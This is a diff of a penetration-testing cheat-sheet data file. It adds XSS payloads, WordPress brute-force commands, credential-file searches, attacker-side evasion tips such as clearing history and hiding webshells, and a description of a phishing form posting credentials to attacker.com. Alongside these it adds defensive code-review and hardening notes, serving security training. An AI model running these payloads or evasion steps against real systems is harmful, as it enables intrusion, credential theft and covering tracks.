-        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       },
       "variations": [
         {
@@ -80943,17 +85030,12 @@ const COMMAND_DATA = {
         {
           "command": "Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search XAMPP directory for config files with credentials",
-          "label": "Find *.txt"
+          "label": "Find configs in xampp"
         },
         {
           "command": "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search all user profiles for document files",
-          "label": "Find *.txt"
-        },
-        {
-          "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
-          "caption": "Hunt for KeePass database files (*.kdbx)",
-          "label": "Find *.kdbx"
+          "label": "Find office docs in Users"
         },
         {
           "command": "Get-ChildItem -Path C:\\ -Include web.config,*.config,appsettings.json,*.env -File -Recurse -ErrorAction SilentlyContinue",
@@ -81334,32 +85416,32 @@ const COMMAND_DATA = {
         {
           "command": "Get-LocalGroupMember Administrators",
           "caption": "List members of local Administrators group",
-          "label": "Get-LocalGroupMember"
+          "label": "Local Administrators members"
         },
         {
           "command": "Get-LocalGroupMember '<group>'",
           "caption": "List members of any local group",
-          "label": "Get-LocalGroupMember"
+          "label": "Members of a named group"
         },
         {
           "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName",
           "caption": "List installed 64-bit software from registry",
-          "label": "Get-ItemProperty"
+          "label": "Installed software (64-bit)"
         },
         {
           "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName",
           "caption": "List installed 32-bit software (WOW6432Node)",
-          "label": "Get-ItemProperty"
+          "label": "Installed software (32-bit)"
         },
         {
           "command": "Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}",
           "caption": "List all running Windows services with binary paths",
-          "label": "Get-CimInstance"
+          "label": "Running services"
         },
         {
           "command": "Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq 'Security Update' } | Select-Object HotFixID, InstalledOn | Sort-Object InstalledOn",
           "caption": "List installed security patches (for missing patch research)",
-          "label": "Get-CimInstance"
+          "label": "Installed security hotfixes"
         },
         {
           "command": "Get-History",
@@ -81379,7 +85461,7 @@ const COMMAND_DATA = {
         {
           "command": "Get-CimInstance win32_service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService'} | Select-Object Name, StartName, PathName",
           "caption": "Find services running under non-standard service accounts (privesc targets)",
-          "label": "Get-CimInstance"
+          "label": "Services w/ non-default account"
         }
       ],
       "examples": [
@@ -81538,7 +85620,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1518.001",
           "MITRE T1083"
-        ]
+        ],
+        "evasion": "Run one consolidated enumeration pass (winPEAS/Seatbelt) in-memory and save output off-host rather than repeated noisy queries."
       }
     },
     {
@@ -81848,7 +85931,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1559.001"
-        ]
+        ],
+        "evasion": "Run one consolidated enumeration pass (winPEAS/Seatbelt) in-memory and save output off-host rather than repeated noisy queries."
       }
     },
     {
@@ -82053,7 +86137,7 @@ const COMMAND_DATA = {
         {
           "description": "Check WinRM port reachability (5985=HTTP, 5986=HTTPS)",
           "command": "Test-NetConnection -ComputerName <hostname> -Port 5985",
-          "label": "Test-NetConnection"
+          "label": "Test WinRM port (5985)"
         },
         {
           "description": "Create PSSession to remote host",
@@ -82078,7 +86162,7 @@ const COMMAND_DATA = {
         {
           "description": "Full WinRM file transfer workflow (check → connect → copy)",
           "command": "Test-NetConnection -ComputerName DATABASE01 -Port 5985\n$Session = New-PSSession -ComputerName DATABASE01\nCopy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\",
-          "label": "Test-NetConnection"
+          "label": "Test + open session + copy file"
         }
       ]
     },
@@ -82162,10 +86246,6 @@ const COMMAND_DATA = {
           "command": "nmap -sV -sC <ip> -p5985,5986 --disable-arp-ping -n"
         },
         {
-          "label": "evil-winrm session",
-          "command": "evil-winrm -i <ip> -u Cry0l1t3 -p P455w0rD!"
-        },
-        {
           "label": "wmiexec command",
           "command": "/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@<ip> \"hostname\""
         }
@@ -82187,7 +86267,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "WinRM with valid creds looks like normal management; avoid dropping tools — run built-ins over the session; clear PSReadline history on the remote host after."
       }
     },
     {
@@ -82439,6 +86520,11 @@ const COMMAND_DATA = {
           "id": "wp-theme-webshell",
           "note": "Manual equivalent via the theme editor.",
           "rel": "alternative"
+        },
+        {
+          "id": "gs-privesc-enum",
+          "rel": "next",
+          "note": "Foothold on the Linux web host — start privesc enumeration"
         }
       ],
       "id": "wp-admin-shell-msf",
@@ -82466,7 +86552,9 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A04:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir.",
+        "evasion": "Rename/obfuscate the theme/plugin webshell and remove it after; use built-in editors over uploads where possible; pace brute-force via xmlrpc to avoid lockouts/alerts."
       }
     },
     {
@@ -82566,7 +86654,17 @@ const COMMAND_DATA = {
           "MITRE T1595.002",
           "OWASP A05:2021"
         ]
-      }
+      },
+      "variations": [
+        {
+          "label": "Version from meta/readme",
+          "command": "curl -s http://<url>/readme.html | grep -i version"
+        },
+        {
+          "label": "Enumerate via wpscan",
+          "command": "wpscan --url http://<url> --no-update"
+        }
+      ]
     },
     {
       "type": "payload",
@@ -82651,7 +86749,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1083",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -82960,7 +87059,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "WordPress plugin echoes $_SERVER['HTTP_USER_AGENT'] without escaping via esc_html() or htmlspecialchars(), allowing HTML/JS injection into the admin panel. No CSP header prevents eval() or external script loads.",
         "vulnerable_config": "# Vulnerable PHP plugin code:\n$wpdb->insert($table_name, array(\n    'useragent' => $_SERVER['HTTP_USER_AGENT'],  // stored raw, no sanitization\n));\n# Later echoed:\necho $record->useragent;  // XSS: any stored <script> tag executes",
-        "secure_config": "# Escape on output:\necho esc_html($record->useragent);  // WordPress escaping function\n# Or: echo htmlspecialchars($record->useragent, ENT_QUOTES, 'UTF-8');\n\n# Add CSP header in wp-config.php or .htaccess:\n# Content-Security-Policy: script-src 'self'; object-src 'none'"
+        "secure_config": "# Escape on output:\necho esc_html($record->useragent);  // WordPress escaping function\n# Or: echo htmlspecialchars($record->useragent, ENT_QUOTES, 'UTF-8');\n\n# Add CSP header in wp-config.php or .htaccess:\n# Content-Security-Policy: script-src 'self'; object-src 'none'",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -83051,7 +87151,27 @@ const COMMAND_DATA = {
           "MITRE T1595.002",
           "OWASP A05:2021"
         ]
-      }
+      },
+      "variations": [
+        {
+          "label": "Vulnerable plugins + users",
+          "command": "wpscan --url http://<url> --enumerate vp,u --api-token <token>"
+        },
+        {
+          "label": "All plugins (aggressive)",
+          "command": "wpscan --url http://<url> --enumerate ap --plugins-detection aggressive"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate users, themes, plugins",
+          "command": "wpscan --url http://<url> --enumerate u,vp,vt --api-token <token>"
+        },
+        {
+          "label": "Brute a discovered user",
+          "command": "wpscan --url http://<url> -U <user> -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc"
+        }
+      ]
     },
     {
       "type": "command",
@@ -83141,7 +87261,13 @@ const COMMAND_DATA = {
           "MITRE T1110",
           "OWASP A07:2021"
         ]
-      }
+      },
+      "variations": [
+        {
+          "label": "Multiple users",
+          "command": "wpscan --url http://<url> -U users.txt -P rockyou.txt --password-attack wp-login"
+        }
+      ]
     },
     {
       "id": "pth-freerdp",
@@ -83209,7 +87335,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "xfreerdp uses Restricted Admin mode to authenticate over RDP with an NTLM hash (/pth) - no plaintext password needed.",
+        "why_it_works": "NTLM/Kerberos authenticate the account's SECRET (its NT hash or Kerberos key), not the plaintext password — the KDC/target never sees the password itself. So possessing the hash/ticket is equivalent to knowing the password: you inject it and authenticate as that user without ever cracking it. With Restricted Admin mode, FreeRDP can authenticate to RDP using only the NT hash.",
         "prerequisites": "A valid NTLM hash, RDP reachable, and Restricted Admin mode enabled on the target.",
         "impact": "An RDP session as the target account via PtH.",
         "detection": "[MITRE T1550.002] Event 4624 Logon Type 3 with Authentication Package NTLM and LogonProcessName NtLmSsp, with NO preceding interactive logon for that account; the same NTLM hash authenticating from an unusual source; 4672 for privileged PtH.",
@@ -83322,7 +87448,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application applies an XSLT stylesheet that is (partially) controlled by user input — either the full .xsl file, specific XPath expressions inside it, or parameters passed into the transformation. XSLT processors (Saxon, libxslt, Xalan) support extension functions that can invoke Java classes or OS commands, making this a server-side code execution vector when combined with user-controlled transformation input.",
         "vulnerable_config": "# Java/Saxon — vulnerable: user-supplied XSLT applied server-side\nimport net.sf.saxon.TransformerFactoryImpl;\n// ...\nSource xslt = new StreamSource(new StringReader(userProvidedXslt)); // user controls XSLT!\nTemplates templates = factory.newTemplates(xslt);\nTransformer t = templates.newTransformer();\nt.transform(new StreamSource(xmlInput), new StreamResult(output));\n\n# Attacker payload in XSLT:\n# <xsl:value-of select=\"java:runtime:exec('id')\"/>\n# (Saxon with Java extension enabled)",
-        "secure_config": "# 1. Never accept user-supplied XSLT stylesheets:\n# Map user choices to server-side stylesheet paths:\nif ($styleChoice === 'compact') { $xslt = '/app/styles/compact.xsl'; }\nelseif ($styleChoice === 'full') { $xslt = '/app/styles/full.xsl'; }\nelse { die('Invalid style'); }\n\n# 2. If dynamic XSLT is unavoidable, disable extension functions:\n# Saxon:\nTransformerFactory factory = new TransformerFactoryImpl();\nfactory.setFeature('http://saxon.sf.net/feature/allow-external-functions', false);\n\n# libxslt (PHP):\n$proc = new XSLTProcessor();\n$proc->setSecurityPrefs(XSL_SECPREF_NONE);  // lock down to NONE\n// XSL_SECPREF_NONE = read/write/exec all forbidden\n\n# 3. Run XSLT transformation in a sandboxed subprocess with no network/FS access"
+        "secure_config": "# 1. Never accept user-supplied XSLT stylesheets:\n# Map user choices to server-side stylesheet paths:\nif ($styleChoice === 'compact') { $xslt = '/app/styles/compact.xsl'; }\nelseif ($styleChoice === 'full') { $xslt = '/app/styles/full.xsl'; }\nelse { die('Invalid style'); }\n\n# 2. If dynamic XSLT is unavoidable, disable extension functions:\n# Saxon:\nTransformerFactory factory = new TransformerFactoryImpl();\nfactory.setFeature('http://saxon.sf.net/feature/allow-external-functions', false);\n\n# libxslt (PHP):\n$proc = new XSLTProcessor();\n$proc->setSecurityPrefs(XSL_SECPREF_NONE);  // lock down to NONE\n// XSL_SECPREF_NONE = read/write/exec all forbidden\n\n# 3. Run XSLT transformation in a sandboxed subprocess with no network/FS access",
+        "code_review": "RED FLAGS (source): XSLT processor with extensions/document() enabled on user-supplied stylesheets.\nGREP:  grep -rniE \"XSLTProcessor|transformToXml|Transformer|xsl:\" .\nSAFE:  disable extension functions + document()/external access; don't accept user stylesheets."
       }
     },
     {
@@ -83412,8 +87539,15 @@ const COMMAND_DATA = {
         "why_it_works": "When user input is placed inside an HTML attribute (e.g., value='INPUT'), the attribute context blocks <script> tags but not attribute event handlers. The payload \" onerror=alert(1) breaks out of the attribute value with the closing quote, then injects a new attribute (event handler) that executes JavaScript when the element event fires. The closing > ends the tag; any remaining original HTML is either valid or commented out.",
         "impact": "XSS in input fields, image src attributes, href values, or any HTML attribute context — a large percentage of reflected XSS vulnerabilities are attribute-context injections that naive <script> filters miss entirely.",
         "detection": "[MITRE T1059.007] WAF: quote + space + on* patterns in parameters (\"  onerror=). CSP violation report: inline event handler blocked. Input validation log: characters like \", ', < in form fields.",
-        "artifacts": "Access log: parameter values containing ' or \" followed by event handler keywords. Stored: attribute-context XSS payload in database field."
-      }
+        "artifacts": "Access log: parameter values containing ' or \" followed by event handler keywords. Stored: attribute-context XSS payload in database field.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
+      },
+      "variations": [
+        {
+          "label": "Close tag then inject",
+          "command": "\"><svg/onload=alert(window.origin)>"
+        }
+      ]
     },
     {
       "id": "xss-discovery-xsstrike",
@@ -83501,7 +87635,8 @@ const COMMAND_DATA = {
         "why_it_works": "XSStrike crawls the target, identifies all input parameters, and fuzzes them with a context-aware payload list. It analyses responses to determine which payloads actually execute, accounting for HTML context (tag body, attribute, JavaScript string). The automated approach covers far more parameters and contexts than manual testing.",
         "impact": "Systematic XSS vulnerability discovery across the entire application surface — finds injections in headers, cookies, POST bodies, and URL parameters that manual spot-checks miss.",
         "detection": "[MITRE T1595] Web application: high volume of requests with HTML/JS metacharacters across many different parameters. Default XSStrike User-Agent (if not randomized). Crawler pattern: systematic traversal of all discovered URLs. WAF: XSS payload patterns in automated scanner traffic.",
-        "artifacts": "Access log: XSStrike scan traffic — many requests with payloads like <HtMl%09onPoIntERENTER+=+confirm()>. WAF log: automated scanner signatures."
+        "artifacts": "Access log: XSStrike scan traffic — many requests with payloads like <HtMl%09onPoIntERENTER+=+confirm()>. WAF log: automated scanner signatures.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       },
       "type": "command"
     },
@@ -83596,7 +87731,8 @@ const COMMAND_DATA = {
         "why_it_works": "document.body.style.background = '#color' modifies the CSS background color of the entire page body via JavaScript DOM manipulation. Executes on every page load for every visitor who has the stored payload served. Cosmetic but persistent — changes the page appearance without altering the server-side template.",
         "impact": "Persistent visual defacement for all site visitors. Combined with other defacement payloads (title, innerHTML), creates a complete page takeover effect. Minimal technical impact but reputational harm.",
         "detection": "[MITRE T1059.007] Content scanning of stored fields for document.body.style references. CSP blocks inline script execution, preventing runtime DOM modification.",
-        "artifacts": "Database: stored XSS payload. All visitors experience modified appearance until payload removed."
+        "artifacts": "Database: stored XSS payload. All visitors experience modified appearance until payload removed.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -83690,7 +87826,8 @@ const COMMAND_DATA = {
         "why_it_works": "document.body.background = 'URL' sets the body's background image via JavaScript, overriding the site's CSS. The attacker-controlled URL can point to an external image server. Every page load fetches and displays the attacker's image as the background.",
         "impact": "Persistent background image replacement — attacker can display propaganda, NSFW content, or brand imagery on the victim site. External image URL means the attacker can change the displayed image by updating the file at their URL without re-exploiting the XSS.",
         "detection": "[MITRE T1059.007] Egress: browsers loading image from unexpected external domain. CSP: img-src 'self' blocks external image sources. Content scanning: document.body.background in stored fields.",
-        "artifacts": "Database: stored payload. Attacker image server: access log shows victim users loading the image. Network monitoring: unexpected image requests from all site visitors to external IP."
+        "artifacts": "Database: stored payload. Attacker image server: access log shows victim users loading the image. Network monitoring: unexpected image requests from all site visitors to external IP.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -83781,7 +87918,8 @@ const COMMAND_DATA = {
         "why_it_works": "document.title = 'text' directly modifies the browser tab title. No DOM element needs to be present — this JavaScript property is always writable. A stored XSS payload executing this on every page load persistently changes the tab title for all visitors, visible in browser tabs and shared screenshots.",
         "impact": "Reputational damage — every visitor sees the defaced title in browser tabs, bookmarks, and shared links. If combined with innerHTML defacement, creates a convincing full-page takeover for screenshots/propaganda. Low technical impact but high visibility.",
         "detection": "[MITRE T1059.007] WAF/content filter: document.title in stored input. FIM on application database: changes to stored content fields. CSP: script-src 'self' blocks inline script if CSP prevents inline execution.",
-        "artifacts": "Database: stored payload containing document.title. Web access log: page serving modified content to all visitors."
+        "artifacts": "Database: stored payload containing document.title. Web access log: page serving modified content to all visitors.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -83870,7 +88008,8 @@ const COMMAND_DATA = {
         "why_it_works": "document.getElementsByTagName('body')[0].innerHTML = 'HTML' replaces the entire page body content with attacker-controlled HTML. This is the most destructive defacement technique — the entire visual page is replaced. jQuery variant: $('body').html('HTML'). The replacement HTML can include images from attacker CDN, styled text, and propaganda content that exactly matches what the attacker wants visitors to see.",
         "impact": "Full page visual takeover — all legitimate content replaced. Impacts every visitor until the stored payload is removed. Used for protest/hacktivist messaging, brand damage, SEO poisoning (if crawled). Can be combined with credential phishing (fake login overlaid on the real site).",
         "detection": "[MITRE T1059.007] File integrity monitoring: page content changes not matching deployment. WAF: innerHTML or document.getElementsByTagName in stored input. Application: detect anomalous content size changes in stored fields. CSP: blocks inline script execution.",
-        "artifacts": "Database: stored payload with innerHTML replacement. Web cache: old page content vs new defaced content comparison. Wayback Machine / Google Cache: evidence of pre-defacement state."
+        "artifacts": "Database: stored payload with innerHTML replacement. Web cache: old page content vs new defaced content comparison. Wayback Machine / Google Cache: evidence of pre-defacement state.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -83969,8 +88108,23 @@ const COMMAND_DATA = {
         "why_it_works": "The basic alert() payload (<script>alert(window.origin)</script>) tests whether JavaScript executes in the rendered page. window.origin confirms the page origin executing the script — proving the injection is on-target and not a sandboxed context. alert(document.cookie) confirms cookie access, validating session hijacking feasibility. The payload executes because the application reflects or stores the input without HTML encoding, and the browser parses it as live JavaScript.",
         "impact": "Proof-of-concept XSS confirmed — establishes that arbitrary JavaScript executes in the victim's browser context. Escalation depends on what comes next: cookie theft, credential phishing, keylogging, page defacement, CSRF-bypass, or full account takeover.",
         "detection": "[MITRE T1059.007] WAF/IDS: <script>, alert(, javascript: in input parameters or stored content. Browser-side CSP violation reports (if CSP deployed with report-uri). Application log: inputs containing HTML/JS metacharacters. Server-side: stored payload visible in database query log if ORM debug logging enabled.",
-        "artifacts": "Application database: stored XSS payload in user-controlled field (comment, username, bio). Access log: GET/POST request containing <script> or encoded equivalent. WAF log: blocked or flagged XSS pattern."
-      }
+        "artifacts": "Application database: stored XSS payload in user-controlled field (comment, username, bio). Access log: GET/POST request containing <script> or encoded equivalent. WAF log: blocked or flagged XSS pattern.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
+      },
+      "variations": [
+        {
+          "label": "Attribute breakout",
+          "command": "\"><script>alert(window.origin)</script>"
+        },
+        {
+          "label": "Event handler (no script tag)",
+          "command": "\" onmouseover=alert(document.domain) x=\""
+        },
+        {
+          "label": "IMG onerror",
+          "command": "<img src=x onerror=alert(document.domain)>"
+        }
+      ]
     },
     {
       "id": "xss-dom",
@@ -84062,8 +88216,19 @@ const COMMAND_DATA = {
         "why_it_works": "DOM-based XSS occurs entirely client-side — the server never sees or stores the payload. JavaScript reads a user-controlled value (document.URL, location.hash, location.search) as a DOM source, then writes it to a dangerous sink (innerHTML, document.write, eval). The img onerror payload works because innerHTML parses HTML including event handlers — <img src='' onerror=alert(1)> triggers when the browser fails to load the blank src, executing the onerror handler.",
         "impact": "Client-side account takeover that never touches the server — no server logs record the attack. DOM XSS can be URL-delivered (reflected) or triggered by stored data that JavaScript processes client-side. Entirely bypasses server-side input validation and WAF inspection (payload is in the URL fragment # which is never sent to the server).",
         "detection": "[MITRE T1059.007] Browser-side only: CSP violation reports (requires CSP with report-uri). URL fragment XSS never reaches server logs — only detectable via client-side monitoring (browser security agents). Hash-based payloads: #<img src=x onerror=alert(1)> visible in browser history but not server logs.",
-        "artifacts": "Browser history: URL with payload in query string or fragment. CSP violation report sent to report-uri endpoint. Client-side logging (if deployed): document.location changes."
-      }
+        "artifacts": "Browser history: URL with payload in query string or fragment. CSP violation report sent to report-uri endpoint. Client-side logging (if deployed): document.location changes.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
+      },
+      "variations": [
+        {
+          "label": "SVG onload",
+          "command": "<svg onload=alert(document.domain)>"
+        },
+        {
+          "label": "iframe javascript:",
+          "command": "<iframe src=\"javascript:alert(document.domain)\">"
+        }
+      ]
     },
     {
       "id": "xss-phishing-form",
@@ -84150,8 +88315,25 @@ const COMMAND_DATA = {
         "why_it_works": "document.write() replaces or appends HTML to the page. The XSS payload writes a fake login form (action=http://attacker.com) that looks identical to the legitimate site's login page. document.getElementById('urlform').remove() deletes any existing form that would reveal the page is injected. The victim sees what appears to be a login prompt on a trusted domain and submits credentials to the attacker.",
